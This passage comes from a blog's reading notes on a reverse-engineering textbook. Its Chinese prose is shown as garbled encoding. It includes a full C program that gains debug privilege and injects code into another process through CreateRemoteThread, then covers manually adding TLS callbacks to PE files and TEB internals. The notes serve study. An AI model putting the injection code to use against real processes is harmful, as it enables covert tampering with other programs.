class="string">"ReverseCore"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open Process</span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   <span class="comment">// dwDesiredAccess</span></span><br><span class="line">        FALSE,                <span class="comment">// bInheritHandle</span></span><br><span class="line">        dwPID)))             <span class="comment">// dwProcessId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for THREAD_PARAM</span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)&amp;param,                 <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for ThreadProc()</span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">1</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)ThreadProc,             <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,            <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                <span class="comment">// lpThreadAttributes</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwStackSize</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],     <span class="comment">// dwStackSize</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],       <span class="comment">// lpParameter</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwCreationFlags</span></span><br><span class="line">        <span class="literal">NULL</span>)))             <span class="comment">// lpThreadId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); <span class="comment">//ä¸€ç›´ç­‰å¾…ä¸Šé¢çš„çº¿ç¨‹ç»“æŸï¼Œå‘å‡ºä¿¡å·ã€‚</span></span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <span class="comment">//è¿›è¡Œææƒã€‚</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The token does not have the specified privilege. \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n USAGE  : %s &lt;pid&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘notepadæ³¨å…¥æ˜¾ç¤ºä¸€ä¸ªå¯¹è¯æ¡†çš„ä»£ç å¹¶è°ƒè¯•æ³¨å…¥ä»£ç ï¼š</p><p>é¦–å…ˆæŸ¥çœ‹å°†notepadåŠ è½½å…¥ODå¹¶è¿è¡Œï¼Œç„¶åä½¿ç”¨Process Explorerè¿›ç¨‹ç®¡ç†æŸ¥çœ‹notepadçš„PIDï¼›ODä¸­è®¾ç½®äº‹ä»¶ç»ˆæ­¢åœ¨æ–°çš„çº¿ç¨‹ï¼ˆ<strong>å³æˆ‘ä»¬åœ¨å¦ä¸€ä¸ªç¨‹åºä½¿ç”¨CreateRemoteThread()åœ¨notepadä¸­åˆ›å»ºçš„çº¿ç¨‹</strong>ï¼‰ã€‚</p><p>å¼€å§‹æ³¨å…¥ï¼ŒODä¸­æˆåŠŸæš‚åœåœ¨æ–°çš„çº¿ç¨‹ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163730590.png" alt="image-20200917163730590"></p><p>æˆåŠŸã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163853250.png" alt="image-20200917163853250"></p><p>å¦å¤–æœ‰ä¸€ä¸ªæ³¨æ„çš„å°±æ˜¯ï¼Œä½¿ç”¨VSç¼–è¯‘ä¸Šé¢çš„ä»£ç æ—¶ä¸€å®šè¦é€‰releaseç¼–è¯‘é€‰é¡¹ï¼Œä¸ç„¶ä¼šæ³¨å…¥å¤±è´¥ã€‚ã€‚åŸå› ä¹‹ä¸€æ˜¯ï¼šreleaseç¼–è¯‘é€‰é¡¹çš„ç¼–è¯‘çš„exeä¸­äºŒè¿›åˆ¶ä»£ç å‡½æ•°çš„é¡ºåºä¸æºä»£ç ä¸­çš„ä¸€è‡´ï¼Œè¿™æ ·å°±èƒ½ä½¿ç”¨åä¸€ä¸ªå‡½æ•°å‡å‰ä¸€ä¸ªå‡½æ•°è·å¾—å‡½æ•°çš„å¤§å°ã€‚å…¶ä»–åŸå› æš‚æ—¶ä¸çŸ¥é“ã€‚ã€‚ã€‚</p><p>æœ€åï¼Œwin32ç¼–ç¨‹è¦å¤šç†Ÿæ‚‰ç†Ÿæ‚‰æ‰è¡Œã€‚ã€‚</p><hr><h2 id="ç¬¬å››åä¸€ç« -ASLR"><a href="#ç¬¬å››åä¸€ç« -ASLR" class="headerlink" title="ç¬¬å››åä¸€ç«  ASLR"></a>ç¬¬å››åä¸€ç«  ASLR</h2><p>æ€»ç»“åœ¨å…¶ä»–å¸–å­ï¼š<strong><a href="http://www.bxnop.cn/2020/05/12/ASLR/">http://www.bxnop.cn/2020/05/12/ASLR/</a></strong></p><hr><h2 id="ç¬¬å››åäº”ç« -TLSå›è°ƒå‡½æ•°"><a href="#ç¬¬å››åäº”ç« -TLSå›è°ƒå‡½æ•°" class="headerlink" title="ç¬¬å››åäº”ç«  TLSå›è°ƒå‡½æ•°"></a>ç¬¬å››åäº”ç«  TLSå›è°ƒå‡½æ•°</h2><h3 id="ä»‹ç»-6"><a href="#ä»‹ç»-6" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>TLSæ˜¯å„çº¿ç¨‹çš„ç‹¬ç«‹çš„æ•°æ®å­˜å‚¨ç©ºé—´ï¼Œç”¨æ¥ä¿å­˜å˜é‡æˆ–å›è°ƒå‡½æ•°ã€‚ä½¿ç”¨TLSæŠ€æœ¯å¯åœ¨çº¿ç¨‹å†…éƒ¨ç‹¬ç«‹ä½¿ç”¨æˆ–ä¿®æ”¹è¿›ç¨‹çš„å…¨å±€æ•°æ®æˆ–é™æ€æ•°æ®ï¼Œå°±åƒå¯¹å¾…è‡ªèº«çš„å±€éƒ¨å˜é‡ä¸€æ ·ã€‚</p><p>TLSå›è°ƒå‡½æ•°æ˜¯æŒ‡ï¼Œæ¯å½“åˆ›å»ºæˆ–ç»ˆæ­¢è¿›ç¨‹æ—¶ï¼ŒTLSå›è°ƒå‡½æ•°éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œï¼Œå‰åå…±2æ¬¡ï¼Œæ‰§è¡Œè¿›ç¨‹çš„ä¸»çº¿ç¨‹ï¼ˆè¿è¡Œè¿›ç¨‹çš„EPä»£ç ï¼‰å‰ï¼ŒTLSå›è°ƒå‡½æ•°ä¼šå…ˆåˆ«è°ƒç”¨æ‰§è¡Œï¼Œè¿™ä½¿å¾—è¯¥ç‰¹å¾åº”ç”¨äºåè°ƒè¯•æŠ€æœ¯ã€‚</p><p>è‹¥ç¼–ç¨‹ä¸­å¯ç”¨äº†TLSåŠŸèƒ½ï¼ŒPEå¤´æ–‡ä»¶å°±ä¼šè®¾ç½®TLSè¡¨ï¼ˆTLS Tableï¼‰é¡¹ç›®ï¼Œå³å¯é€‰å¤´ä¸­çš„<strong>IMAGE_DATA-DRRECTORY[9]</strong>è®°å½•äº†TLSè¡¨çš„RVAä¸SIZEã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD StartAddressOfRawData; <span class="comment">//TLSé™æ€æ•°æ®å¼€å§‹åœ°å€</span></span><br><span class="line">    DWORD EndAddressOfRawData; <span class="comment">//TLSé™æ€æ•°æ®ç»“æŸåœ°å€</span></span><br><span class="line">    DWORD AddressOfIndex; <span class="comment">//PDWORD</span></span><br><span class="line">    DWORD AddressOfCallBacks; <span class="comment">//PIMAGE_TLS_CALLBACK * ï¼Œæ‰§è¡Œå‡½æ•°æŒ‡é’ˆ(VA)æ•°ç»„ã€‚</span></span><br><span class="line">    DWORD SizeOfZeroFill; <span class="comment">//ç›´æ¥å¡«å……ä¸º0çš„å¤§å°</span></span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 *PIMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line">é™æ€æ•°æ®æ€»å¤§å°å°±æ˜¯EndAddressOfRawData-StartAddressOfRawData+SizeOfZeroFill</span><br></pre></td></tr></table></figure><blockquote><p>IMAGE_TLS_DIRECTORYç»“æ„ä½“æœ‰2ç§ç‰ˆæœ¬ï¼Œåˆ†åˆ«ä¸º32ä½ï¼ˆå¤§å°ï¼š18hï¼‰ä¸64ä½ï¼Œä½†åªæ˜¯æˆå‘˜å­—èŠ‚å¤§å°ä¸ä¸€æ ·ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TLS Callbackå›è°ƒå‡½æ•°çš„å®šä¹‰ï¼š</span><br><span class="line"><span class="keyword">typedef</span> VOID </span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DLLHandle,DWORD Reason,PVOID Reserved);</span><br><span class="line"></span><br><span class="line">å…¶ä¸­å‚æ•°Reasonä¸ºè°ƒç”¨å›è°ƒå‡½æ•°çš„åŸå› :</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH 1 è¿›ç¨‹å¯åŠ¨</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH 2 çº¿ç¨‹å¯åŠ¨</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DERACH 3 çº¿ç¨‹é€€å‡º</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH 0 è¿›ç¨‹é€€å‡º</span></span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•TLSå›è°ƒå‡½æ•°"><a href="#è°ƒè¯•TLSå›è°ƒå‡½æ•°" class="headerlink" title="è°ƒè¯•TLSå›è°ƒå‡½æ•°"></a>è°ƒè¯•TLSå›è°ƒå‡½æ•°</h3><p>å› ä¸ºTLSå›è°ƒå‡½æ•°åœ¨EPä»£ç ä¹‹å‰è¢«è°ƒç”¨æ‰§è¡Œäº†ï¼Œç›´æ¥ä½¿ç”¨è°ƒè¯•å™¨æ‰“å¼€æ˜¯æ— æ³•è°ƒè¯•çš„ã€‚</p><p>ä¿®æ”¹ollydbgçš„é€‰é¡¹ï¼Œè®©è°ƒè¯•å™¨æš‚åœçš„ä½ç½®æ˜¯ç³»ç»Ÿæ–­ç‚¹ï¼ˆSystem Startup Breakpointï¼‰æ¥è°ƒè¯•TLSå›è°ƒå‡½æ•°ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711093140091.png" alt="image-20200711093140091"></p><blockquote><p>åœ¨Ollydbgè°ƒè¯•å™¨çš„é»˜è®¤è®¾ç½®ä¸‹ï¼Œè°ƒè¯•å™¨ä¼šåœ¨EPå¤„æš‚åœï¼Œè€ŒWinDbgè°ƒè¯•å™¨é»˜è®¤åœ¨ç³»ç»Ÿå¯åŠ¨æ–­ç‚¹æš‚åœã€‚</p></blockquote><p>ä½¿ç”¨CFF exploreræŸ¥çœ‹tlså›è°ƒè¡¨å›è°ƒå‡½æ•°çš„åœ°å€ã€‚å¯ä»¥çœ‹åˆ°æœ‰2ä¸ªå›è°ƒå‡½æ•°ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103234916.png" alt="image-20200711103234916"></p><p>ä½¿ç”¨olldbg advancedæ’ä»¶ï¼Œæ‰“å¼€æš‚åœåœ¨å›è°ƒå‡½æ•°çš„é€‰é¡¹ã€‚F9è¿è¡Œã€‚å¯ä»¥çœ‹åˆ°ï¼Œå’Œä¸Šé¢æŸ¥çœ‹çš„å›è°ƒå‡½æ•°åœ°å€ä¸€æ ·ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103428275.png" alt="image-20200711103428275"></p><h3 id="æ‰‹å·¥æ·»åŠ TLSå›è°ƒå‡½æ•°"><a href="#æ‰‹å·¥æ·»åŠ TLSå›è°ƒå‡½æ•°" class="headerlink" title="æ‰‹å·¥æ·»åŠ TLSå›è°ƒå‡½æ•°"></a>æ‰‹å·¥æ·»åŠ TLSå›è°ƒå‡½æ•°</h3><p>é¦–å…ˆç¡®å®šIMAGE_TLS_DIRECTORYç»“æ„ä½“ä¸TLSå›è°ƒå‡½æ•°æ”¾åˆ°æ–‡ä»¶çš„é‚£ä¸ªä½ç½®ã€‚å‘PEæ–‡ä»¶æ·»åŠ ä»£ç æˆ–æ•°æ®æ—¶ï¼Œæœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><blockquote><p>1.æ·»åŠ åˆ°èŠ‚åŒºçš„æœ«å°¾çš„ç©ºç™½åŒºåŸŸã€‚2.å¢åŠ æœ€åä¸€ä¸ªèŠ‚åŒºçš„å¤§å°ã€‚3.åœ¨æœ€åå¢åŠ æ–°èŠ‚åŒºã€‚</p></blockquote><p>ä¹‹å‰çš„å†…åµŒæ‰“è¡¥ä¸ä½¿ç”¨çš„ç¬¬1ç§æ–¹æ³•ï¼Œè¿™é‡Œä½¿ç”¨ç¬¬äºŒç§ã€‚</p><p>æŸ¥çœ‹æœ€åä¸€ä¸ªèŠ‚åŒºçš„å±æ€§ï¼š<strong>æ³¨æ„section alignment:1000ï¼Œfile alignment:200</strong><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711105035280.png" alt="image-20200711105035280"></p><p>çŸ¥é“æ–‡ä»¶å¯¹é½å•ä½æ˜¯200ï¼Œæ‰€ä»¥è¿™é‡Œå°†æœ€åä¸€ä¸ªèŠ‚åŒºå¤§å°å¢åŠ 200ï¼ˆå³æ–‡ä»¶æ–‡ä»¶å¤§å°å˜ä¸º9200+200 = 9400ï¼‰ï¼Œé‚£éœ€è¦ä¿®æ”¹æœ€åä¸€ä¸ªèŠ‚åŒºçš„Raw Sizeä»200å¢åŠ åˆ°400ã€‚ä½†æ˜¯Virtual Sizeå¯ä»¥ä¸ä¿®æ”¹ï¼Œå› ä¸ºæ–‡ä»¶å¯¹é½å•ä½æ˜¯1000ï¼ŒåŠ ä¸Š200åä¹Ÿè¿œå°äº1000çš„ã€‚</p><p>ä¿®æ”¹Raw Sizeï¼š400ã€‚å¢åŠ 3ä¸ªå±æ€§ï¼š1.èŠ‚ä¸­åŒ…å«ä»£ç ï¼›2.å¯æ‰§è¡Œï¼›3.å¯å†™ã€‚</p><blockquote><p>20 IMAGE_SCN_CNT_CODE èŠ‚ä¸­åŒ…å«ä»£ç </p><p>20000000 IMAGE_SCN_MEM_EXECUTE å¯æ‰§è¡Œ</p><p>80000000 IMAGE_SCN_MEM_WRITE å¯å†™</p></blockquote><p>ä¸‹é¢è®¾ç½®TLSè¡¨ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711110919960.png" alt="image-20200711110919960"></p><p>å†™å…¥IMAGE_TLS_DIRECTORYç»“æ„ä½“ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711115845463.png" alt="image-20200711115845463"></p><p>å†™å…¥å›è°ƒå‡½æ•°ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123118819.png" alt="image-20200711123118819"></p><p>æˆåŠŸï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123251886.png" alt="image-20200711123251886"></p><hr><h2 id="ç¬¬å››åå…­ç« -TEB"><a href="#ç¬¬å››åå…­ç« -TEB" class="headerlink" title="ç¬¬å››åå…­ç«  TEB"></a>ç¬¬å››åå…­ç«  TEB</h2><h3 id="ä»‹ç»-7"><a href="#ä»‹ç»-7" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>TEBï¼šçº¿ç¨‹ç¯å¢ƒå—ï¼Œè¯¥ç»“æ„ä½“åŒ…å«è¿›ç¨‹ä¸­è¿è¡Œçº¿ç¨‹çš„å„ç§ä¿¡æ¯ï¼Œè¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹éƒ½å¯¹åº”ä¸€ä¸ªTEBç»“æ„ä½“ã€‚</p><p>TEBç»“æ„ä½“ä¸­çš„é‡è¦æˆå‘˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x000</span> NtTib:_NT_TIB</span><br><span class="line">+<span class="number">0x030</span> ProcessEnvironmentBlock:Ptr32_PEBï¼ˆæŒ‡å‘PEBç»“æ„ä½“çš„æŒ‡é’ˆï¼‰</span><br></pre></td></tr></table></figure><p>NtTibæˆå‘˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EXCEPTION_REGISIRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125;NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure><p>ExceptionListæˆå‘˜æŒ‡å‘EXCEPTION_REGISIRATION_RECORDç»“æ„ä½“ç»„æˆçš„é“¾è¡¨ï¼Œå®ƒç”¨äºWindows OSçš„SEHã€‚</p><p>Selfæˆå‘˜æ˜¯_NT_TIBç»“æ„ä½“çš„è‡ªå¼•ç”¨æŒ‡é’ˆï¼Œä¹Ÿæ˜¯TEBç»“æ„ä½“çš„æŒ‡é’ˆï¼ˆå› ä¸ºTEBç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯_NT_TIBç»“æ„ä½“ï¼‰</p><h3 id="å®æ“-2"><a href="#å®æ“-2" class="headerlink" title="å®æ“"></a>å®æ“</h3><p>Ntdll.NtCurrentTebï¼ˆï¼‰APIç”¨æ¥æ”¾å›å½“å‰çº¿ç¨‹çš„TEBç»“æ„ä½“çš„åœ°å€ã€‚</p><p>ODä¸­è½½å…¥ä¸€ä¸ªç¨‹åºï¼Œæœç´¢è¯¥APIå¹¶è¿›å…¥ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717205028466.png" alt="image-20200717205028466"></p><blockquote><p>TEBç»“æ„ä½“çš„åœ°å€ä¸FSæ®µå¯„å­˜å™¨æ‰€æŒ‡çš„æ®µå†…å­˜çš„åŸºå€æ˜¯ä¸€æ ·çš„ã€‚</p></blockquote><h3 id="FSæ®µå¯„å­˜å™¨"><a href="#FSæ®µå¯„å­˜å™¨" class="headerlink" 